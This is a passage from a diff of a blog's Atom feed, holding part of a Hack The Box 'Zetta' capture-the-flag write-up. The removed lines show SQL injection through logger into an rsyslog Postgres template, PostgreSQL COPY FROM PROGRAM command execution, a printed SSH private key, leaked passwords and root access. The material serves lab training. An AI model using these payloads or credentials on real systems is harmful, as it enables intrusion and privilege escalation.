-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/text&amp;gt;&lt;/span&gt;
-                        &lt;span class=&quot;nt&quot;&gt;&amp;lt;/todo&amp;gt;&lt;/span&gt;
-                        &lt;span class=&quot;nt&quot;&gt;&amp;lt;todo&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;done=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;no&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;collapse=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;no&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-                                &lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;Rework syslog configuration to push all events to the DB&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
-                                &lt;span class=&quot;nt&quot;&gt;&amp;lt;text&amp;gt;&lt;/span&gt; 
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/text&amp;gt;&lt;/span&gt;
-                        &lt;span class=&quot;nt&quot;&gt;&amp;lt;/todo&amp;gt;&lt;/span&gt;
-                        &lt;span class=&quot;nt&quot;&gt;&amp;lt;todo&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;done=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;no&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;collapse=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;no&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-                                &lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;Find/write GUI for syslog-db access/view&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
-                                &lt;span class=&quot;nt&quot;&gt;&amp;lt;text&amp;gt;&lt;/span&gt; 
-........
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;From above todo list I had to check postgresql log for errors, Hence it confirmed me to exploit log. After a lot of enumeration I found something fishy in &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/rsyslog.d/.git&lt;/code&gt; where I found &lt;em&gt;pgsql.conf&lt;/em&gt; but I wasn’t able to cat that file due to permission error. So I used other ways to read that file. For that I used git command since, there is .git repo in that directory as&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;roy@zetta:/tmp$ cd /etc/rsyslog.d/
-roy@zetta:/etc/rsyslog.d$ git clone /etc/rsyslog.d/.git /tmp/.git
-Cloning into '/tmp/.git'...
-done.
-roy@zetta:/etc/rsyslog.d$ ls -al /tmp/.git/
-total 16
-drwxr-xr-x  3 roy  roy  4096 Feb 20 06:21 .
-drwxrwxrwt 11 root root 4096 Feb 20 06:21 ..
-drwxr-xr-x  8 roy  roy  4096 Feb 20 06:21 .git
--rw-r--r--  1 roy  roy   807 Feb 20 06:21 pgsql.conf
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Now I was able to cat that file and where the file indicates there is sql injection one of the template and gives more information about local logging. Logging was new for me so googled and collected information about it. If you have known about logging then you can escape this blog but if you are unknown about logging in syslog then you can click &lt;a href=&quot;http://nginx.org/en/docs/syslog.html&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;roy@zetta:/tmp/.git$ cat pgsql.conf
-### Configuration file for rsyslog-pgsql
-### Changes are preserved
-# https://www.rsyslog.com/doc/v8-stable/configuration/modules/ompgsql.html
-# Used default template from documentation/source but adapted table
-# name to syslog_lines so the Ruby on Rails application Maurice is
-# coding can use this as SyslogLine object.
-# template(name=&quot;sql-syslog&quot; type=&quot;list&quot; option.sql=&quot;on&quot;) {
-  constant(value=&quot;INSERT INTO syslog_lines (message, devicereportedtime) values ('&quot;)
-  property(name=&quot;msg&quot;)
-  constant(value=&quot;','&quot;)
-  property(name=&quot;timereported&quot; dateformat=&quot;pgsql&quot; date.inUTC=&quot;on&quot;)
-  constant(value=&quot;')&quot;)
-}
-# load module
-module(load=&quot;ompgsql&quot;)
-
-#Only forward local7.info for testing.
-local7.info action(type=&quot;ompgsql&quot; server=&quot;localhost&quot; user=&quot;postgres&quot; pass=&quot;test1234&quot; db=&quot;syslog&quot; template=&quot;sql-syslog&quot;)
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Since there was sql in syslog postgres I tried to get the shell of postgres for that I used command as&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;roy@zetta:/tmp/.git$ psql -d syslog
-psql: FATAL:  role &quot;roy&quot; does not exist
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;where -d, –dbname=DBNAME   database name to connect to (default: “roy”)&lt;/p&gt;
-
-&lt;p&gt;So,for that I tried to create the user roy using postgres, logger and sql injection so my payload was&lt;/p&gt;
-
-&lt;h3 id=&quot;logger---sql---superuser-roy&quot;&gt;Logger -&amp;gt; Sql -&amp;gt; Superuser roy&lt;/h3&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;roy@zetta:~$ logger -p local7.info &quot;aaa',current_timestamp);CREATE USER roy; --&quot;
-roy@zetta:~$ psql -d syslog
-psql (11.4 (Debian 11.4-1))
-Type &quot;help&quot; for help.
-
-syslog=&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;After that, I created the user roy for syslog and used the postgres command to see what things are inside the syslog database. Since this box got postgres I googled for latest exploit of postgresql and got &lt;code class=&quot;highlighter-rouge&quot;&gt;COPY FROM PROGRAM Command Execution vulnerability&lt;/code&gt;. For more info about it you can click &lt;a href=&quot;https://www.exploit-db.com/exploits/46813&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
-
-&lt;p&gt;And instead of using Metasploit I used the manual ways to exploit this vulnerability for that I used this blog &lt;a href=&quot;https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/authenticated-arbitrary-command-execution-on-postgresql-9-3/&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
-
-&lt;p&gt;On reading blogs to use &lt;code class=&quot;highlighter-rouge&quot;&gt;COPY&lt;/code&gt; command user must be superuser only then I can exploit it. For that I changed the user &lt;em&gt;roy&lt;/em&gt; to superuser as&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;roy@zetta:~$ logger -p local7.info &quot;aaa',current_timestamp);ALTER USER roy WITH SUPERUSER; --&quot;                                                             
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Now I exploit the postgres and able to run the command injection in syslog database. At my first attempt I was interrupted and unable to run command in postgres but after 2nd/3rd attempt I used (&lt;code class=&quot;highlighter-rouge&quot;&gt;$$&lt;/code&gt;)Dollar-quoting for escaping single quotes in postgres to exploit command injection.&lt;/p&gt;
-
-&lt;h3 id=&quot;command-injection---postgres-shell&quot;&gt;Command Injection -&amp;gt; Postgres shell.&lt;/h3&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;syslog=# CREATE TABLE RCE(RCE text);
-CREATE TABLE
-syslog=# COPY RCE FROM PROGRAM $$id$$; 
-COPY 1
-syslog=# SELECT * FROM RCE;
-                                  rce                                   
-------------------------------------------------------------------------
- postgres
- uid=106(postgres) gid=113(postgres) groups=113(postgres),112(ssl-cert)
-(2 rows)
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Now I have to get the postgres shell for that I should have id_rsa key. Now for that I found the &lt;code class=&quot;highlighter-rouge&quot;&gt;id_rsa&lt;/code&gt; key of postgres in directory &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/lib/postgres/.ssh/&lt;/code&gt;
-So for that I used that cat command in command injection and able to cat the RSA key.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;syslog=# COPY RCE FROM PROGRAM $$cat ../../.ssh/id_rsa$$;                                                                                                
-COPY 6                                                                                                                                                
-syslog=# SELECT * FROM RCE;                                                                                                                           
-                                     rce                                                                                                              
-------------------------------------------------------------------------------
- postgres
- uid=106(postgres) gid=113(postgres) groups=113(postgres),112(ssl-cert)
- /var/lib/postgresql/11/main
- total 20
- drwxr-xr-x  4 postgres postgres 4096 Jul 27  2019 .
- drwxr-xr-x 27 root     root     4096 Aug 27 05:39 ..
- drwxr-xr-x  3 postgres postgres 4096 Jul 27  2019 11
- lrwxrwxrwx  1 root     root        9 Jul 27  2019 .bash_history -&amp;gt; /dev/null
- -rw-------  1 postgres postgres  744 Jul 27  2019 .psql_history
- drwx------  2 postgres postgres 4096 Jul 27  2019 .ssh
- total 20
- drwx------ 2 postgres postgres 4096 Jul 27  2019 .
- drwxr-xr-x 4 postgres postgres 4096 Jul 27  2019 ..
- -rw------- 1 postgres postgres  747 Jul 27  2019 authorized_keys
- -rw------- 1 postgres postgres 3389 Jul 27  2019 id_rsa
- -rw-r--r-- 1 postgres postgres  747 Jul 27  2019 id_rsa.pub
- -----BEGIN OPENSSH PRIVATE KEY-----
-b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn
-NhAAAAAwEAAQAAAgEAxyTwk/nCdFnnjTEyl8ShdNbEzcYLGv4qGAi+EuZd1XnqgsUQH1qu
-wPwA2ytXyaz27qkkjs3y6lEtu3w4DBwXycqk3DMe/5ir6JCtsV2+GnNFJxUfpF3X05lmqg
-1Ua6rnyjYVmi4t6BxxoCvOd/X8WORcOselG9RZwk//gjIsElappX/flotyXdgEd0uyx6Ul
-gXFb9WeX2EfSd3D8HpyclYhkaVq7ng0yzJAvF4hbEqMq1ERW/weWyE32XvDKb+aHLY44UB
-iCQhdrIdiY3ctek4VUlBnCzULD4btFwrZyvxvrq+ievIEJtU3o3z6zh+s9/CQ0vze9ylXp
-eceLFaoPr2BcPsSLmld9ac3O9263sgTNYWVG+g6TQvV+Un7Ut8Ap9OctDCzjw2Q8xU/cpt
-ebWCkMhAgSGSNwxodztd1x9PqY0Vrje3aCSvlgP8tyl9FxXxA5fg4JvmAlhKLhAhtpFTs9
-3Xro6Vcz8BGdOXOIqlaKbOTj2YmsI+exxzI7pl3gKtF6/vLu/kUQl2r/eXhW+seY7AsfUG
-J6zOtUBgfSzYG6gqQr2tah7cbG6qCYwt9ShqgAshWZV66Y94nyZibYwTOPq7LvxJmIMLlJ
-9xwbWRhLq7V+xvIB5eObmkjVVfnsz71XtXVI4wRBZ9s+vrTcZiwrCI228IWFaOCbwr8e4N
-MAAAdQUkfH2VJHx9kAAAAHc3NoLXJzYQAAAgEAxyTwk/nCdFnnjTEyl8ShdNbEzcYLGv4q
-GAi+EuZd1XnqgsUQH1quwPwA2ytXyaz27qkkjs3y6lEtu3w4DBwXycqk3DMe/5ir6JCtsV
-2+GnNFJxUfpF3X05lmqg1Ua6rnyjYVmi4t6BxxoCvOd/X8WORcOselG9RZwk//gjIsElap
-pX/flotyXdgEd0uyx6UlgXFb9WeX2EfSd3D8HpyclYhkaVq7ng0yzJAvF4hbEqMq1ERW/w
-eWyE32XvDKb+aHLY44UBiCQhdrIdiY3ctek4VUlBnCzULD4btFwrZyvxvrq+ievIEJtU3o
-3z6zh+s9/CQ0vze9ylXpeceLFaoPr2BcPsSLmld9ac3O9263sgTNYWVG+g6TQvV+Un7Ut8
-Ap9OctDCzjw2Q8xU/cptebWCkMhAgSGSNwxodztd1x9PqY0Vrje3aCSvlgP8tyl9FxXxA5
-fg4JvmAlhKLhAhtpFTs93Xro6Vcz8BGdOXOIqlaKbOTj2YmsI+exxzI7pl3gKtF6/vLu/k
-UQl2r/eXhW+seY7AsfUGJ6zOtUBgfSzYG6gqQr2tah7cbG6qCYwt9ShqgAshWZV66Y94ny
-ZibYwTOPq7LvxJmIMLlJ9xwbWRhLq7V+xvIB5eObmkjVVfnsz71XtXVI4wRBZ9s+vrTcZi
-wrCI228IWFaOCbwr8e4NMAAAADAQABAAACAQDFo+Gn2o6kjr2BoTwG570dijDT0CMhbPI1
-3CdX9o1V2qNlmVJA6+zX1sK6wa9klmaTwgZoO/lDl8F9evDdA9yQBq/LYmj3XnvuWfgoOV
-L8ST5uZUZ8CC608F+1kXkhSgK06yxRUld5LxGN1ywYXmdNiYYHSDCTCBL1CBQbENQwdxXz
-DI/Ihyi//i2gf940ybAJYYnUajWHDvDQXa+6ac/1j+GntcbSO2MZJle2UTuhqZJODG0Sum
-No9Ab5fpxKpk2uZqF4zHoqQbevZZmBNd7tJbwlJ9Pvhr2FAClh71S+WmVwvXMcviv2ZhYh
-yca/tDZWUVCQHjAb6VvH4sQkgh0BPdY8nH52FWCWA0KZUvFWtzn5gZwHw+JMtNRMnoNyR3
-wKLbRHAluUnEZZ6xFoo1UiWyYe3Yps0ARmuBMCQSnFq3QWRi9h7feja5g1cjGg27At2+yR
-18bPkb98faep/kFld7Aja2z67SdAL2uB+V2uwKwLd46hmA0HEK0hAi0PaPfXEDQXyZZhZX
-+s1vqVsWwrLUeUfR2wi+vDQDGeGm20Mb1ZlcDdQHLiF6addRcuDK0DjBD2UTDjKHaKH/pf
-EGTNwPLHWoix/Ua+JZHdEpScmqkz/bgxJWclI0vN+KGwoK9scii+0rF9DR7q+Vlujy+vUw
-fYekfcNde2heW09mzQwQAAAQAKJJlsB4rpRS2jDN8YNa6Tlv6/yrQ/zQm3XyqNHVmLVred
-gLrlTsCn5I2pumroQ0ikY6KwHqo/SZBdLARf3SKUW8C7RFsfPleT4/wz4FVvPrvnRt1x25
-wEtzpEXzwcM+0bvrnCle2/WO93i9/ngkaoq+eAyzUUbhtJ4D++KjkSgEybQO49Mm2NmFMz
-vuMUKfIK5GOD1owJTFCobVKoyju85kWv28wYZyOr2Hb3HgERsm746SzoIZ6GDyTGonK0aw
-8h7HZk52iiJfBtMkk5MU65iprMOE27b5PSADTQmepq7pgABRWyY3c8v3W+DvtFCsVzxchs
-ElVpgNReaNX0Lg4iAAABAQDwvf4twBUem54a/SpQTEOZA3/1oqJlsG14XUUV9drjT/6dNy
-zWIJaFGS3NObB1AsXYpIN6dOn0q12kRVH9OTUhFF9Ou3Wm6uytNVhpJOic3y09egJ/U9wM
-tiymf8DxHhVx3mEX3Qr2GHPN6n3eYce+/JGaNugR2+1keUk76orwN2paENfyuqAg4/k8/w
-zDYvIzNsK0A8aiJ4hctJxHl4mlXwO0oGNtNFBUIrov4iI8P6gghzsNPGsuyTfBPayFBCF4
-8nGT1ocY0ItJKfTejPhN7w5pdM6M7bT3uT7cUEGkZANP5AYUfsEhh8kpwsoER9HbKQipvz
-xPSa16LeeciKbDAAABAQDTxAcJANWF//B58W+UYGN0DyZfFNljToCqUT71rIDkckyWv5fi
-PbxoQzxhXW6BprnwlqCCnq22fhiJp+gJE49Ag3BgqW9sCbGFh/ft09kL/tv29vDOno32FC
-PAcXDAMuGF46hURvgSjble8Z2ISmkGnV8XZ+ka/nqtDQRiZ51GMVgDz+tjfcrYDqoKO/r1
-cqBDo5fVoYKc8K0id9cXLTwqD+W6zT1UCDExNTcwByrqDMSIOmj5FDndwVVg29YP7TUE8i
-GolHzO58rsJVHYuiAGHBooDln7zL6CqmAhKgFUfLoAT+NRlHiXbltdSxZ7K0SWcNA32Trq
-d5qRdqtIHNyxAAAAFUJhY2t1cCBLZXkgZm9yIEJhcm1hbgECAwQF
------END OPENSSH PRIVATE KEY-----
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;After that I copied &lt;code class=&quot;highlighter-rouge&quot;&gt;id_rsa&lt;/code&gt; key to name &lt;code class=&quot;highlighter-rouge&quot;&gt;id_rsa&lt;/code&gt; key in my local machine and used. This was I got postgres shell&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr4n173:~$ ssh -i id_rsa postgres@zetta.htb
-Linux zetta 4.19.0-5-amd64 #1 SMP Debian 4.19.37-5+deb10u1 (2019-07-19) x86_64
-postgres@zetta:~$ whoami
-postgres
-postgres@zetta:~$ id
-uid=106(postgres) gid=113(postgres) groups=113(postgres),112(ssl-cert)
-postgres@zetta:~$
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h1 id=&quot;postgres---root&quot;&gt;Postgres -&amp;gt; Root&lt;/h1&gt;
-
-&lt;p&gt;Now I got the shell of user postgres and searched its home directory and got .psql_history.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;postgres@zetta:~$ cat .psql_history 
-CREATE DATABASE syslog;
-\c syslog
-CREATE TABLE syslog_lines ( ID serial not null primary key, CustomerID bigint, ReceivedAt timestamp without time zone NULL, DeviceReportedTime timestamp without time zone NULL, Facility smallint NULL, Priority smallint NULL, FromHost varchar(60) NULL, Message text, NTSeverity int NULL, Importance int NULL, EventSource varchar(60), EventUser varchar(60) NULL, EventCategory int NULL, EventID int NULL, EventBinaryData text NULL, MaxAvailable int NULL, CurrUsage int NULL, MinUsage int NULL, MaxUsage int NULL, InfoUnitID int NULL , SysLogTag varchar(60), EventLogType varchar(60), GenericFileName VarChar(60), SystemID int NULL);
-\d syslog_lines
-ALTER USER postgres WITH PASSWORD 'sup3rs3cur3p4ass@postgres';
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;and I have todo list from shell of roy .tudu.xml and got this.&lt;/p&gt;
-
-&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;nt&quot;&gt;&amp;lt;todo&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;done=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;no&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;collapse=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;no&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-      &lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;Change shared password scheme from &lt;span class=&quot;ni&quot;&gt;&amp;amp;lt;&lt;/span&gt;secret&lt;span class=&quot;ni&quot;&gt;&amp;amp;gt;&lt;/span&gt;@userid to something more secure.&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
-                                &lt;span class=&quot;nt&quot;&gt;&amp;lt;text&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/text&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;From above two notes: format of password of user posgres and todo list I made conclusion as password root should be &lt;code class=&quot;highlighter-rouge&quot;&gt;sup3rs3cur3p4ass@root&lt;/code&gt;.
-Finally that worked and got the &lt;code class=&quot;highlighter-rouge&quot;&gt;root shell&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;root.txt&lt;/code&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;postgres@zetta:~$ su root
-Password: 
-root@zetta:/var/lib/postgresql# cd
-root@zetta:~# whoami
-root
-root@zetta:~# id
-uid=0(root) gid=0(root) groups=0(root)
-root@zetta:~# cat root.txt
-b9407e837fb****************
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;This way I got the root of zetta box and learned alot from this box. So I would like to thank creator of this box &lt;code class=&quot;highlighter-rouge&quot;&gt;jkr&lt;/code&gt; for such an awesome box.&lt;/p&gt;
-
-&lt;p&gt;I will be posting writeup of next box after box retired. I would like to Thank readers for being with me through out this writeup.&lt;br /&gt;
-Feedback are really appreciated !!&lt;br /&gt;
-Tweet about this writeup if you like.&lt;/p&gt;
-
-&lt;p&gt;You can follow and see my blog in my medium profile: &lt;a href=&quot;https://medium.com/@gr4n173&quot;&gt;gr4n173&lt;/a&gt;.&lt;/p&gt;</content><author><name>gr4n173&gt;</name></author><category term="linux" /><category term="htb" /><category term="ftp" /><category term="postgres" /><category term="rsync" /><category term="ipv6" /><category term="sqli" /><category term="rce" /><summary type="html">HTB:Zetta</summary></entry></feed>
+&lt;p&gt;You can see more blog at my medium here: &lt;a href=&quot;https://medium.com/@gr4n173&quot;&gt;gr4n173&lt;/a&gt;.&lt;/p&gt;</content><author><name>gr4n173&gt;</name></author><category term="linux" /><category term="htb" /><category term="ftp" /><category term="sqli" /><category term="RE" /><category term="lkm" /><category term="fuzz" /><category term="whois" /><category term="pcap" /><category term="ffuf" /><summary type="html">HTB:Scavenger</summary></entry></feed>
